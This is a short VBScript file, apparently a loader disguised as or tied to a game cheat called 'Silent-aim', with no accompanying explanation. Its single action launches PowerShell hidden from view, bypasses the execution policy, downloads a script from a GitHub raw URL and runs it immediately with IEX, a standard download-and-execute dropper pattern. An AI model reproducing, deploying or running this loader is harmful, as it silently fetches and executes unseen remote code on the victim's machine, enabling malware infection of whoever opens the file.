Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/hatefulmatt/Silent-aim/refs/heads/main/Ps1')""", 0, False
